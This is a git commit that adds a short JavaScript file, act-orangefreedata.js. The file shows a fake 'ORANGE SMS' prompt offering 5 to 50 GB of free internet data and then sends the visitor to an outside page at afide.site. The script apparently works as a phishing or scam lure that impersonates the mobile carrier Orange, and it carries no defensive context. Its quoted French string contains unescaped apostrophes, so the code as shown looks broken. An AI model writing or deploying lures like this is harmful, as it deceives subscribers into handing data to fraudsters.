7ea1e5f48e8bbeb56f4b727d4057baf622456aac
ufaiba <ufaiba247@gmail.com>
2026-06-30 23:20:23 -0700

    Create act-orangefreedata.js

---
+++ act-orangefreedata.js
@@ -0,0 +1,5 @@
+var password = 'Données gratuites'
+password=prompt('ORANGE SMS: Cher client, en tant qu'abonné de longue date, vous bénéficiez d'une offre de récompense allant de 5 Go à 50 Go de données Internet gratuites ; cliquez sur « Données gratuites » pour vérifier votre offre dès maintenant. ','Données gratuites');
+if (password != 'Données gratuites') {
+location.href='https://afide.site/orangefreedata.html';
+}
